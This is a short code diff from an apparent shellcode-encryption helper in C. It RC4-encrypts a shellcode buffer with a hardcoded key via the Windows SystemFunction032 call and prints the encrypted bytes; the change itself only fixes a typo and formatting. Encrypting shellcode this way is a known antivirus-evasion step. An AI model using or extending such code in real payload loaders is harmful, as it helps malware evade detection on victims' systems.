@@ -65,11 +65,11 @@ int main() {
 	BYTE key[] = "thisissomethinghardtocrackmicroslophehe9999399393"; //key
 	DWORD keysize = strlen((char*)key); //key size
 	DWORD payloadsize = sizeof(shellcode) - 1; //shellcode size 
-	
-	Rc4_enc_via_systemfunc32(key,shellcode,keysize,payloadsize); // putting things in a wrapper and calls Systemfunction032
+
+	Rc4_enc_via_systemfunc032(key, shellcode, keysize, payloadsize); // putting things in a wrapper and calls Systemfunction032
 
 	for (int i = 0; i < payloadsize; i++) {
-		printf("\\x%02x",shellcode[i]); // printing enc shellcode
+		printf("\\x%02x", shellcode[i]); // printing enc shellcode
 	}
 
-	}
+}
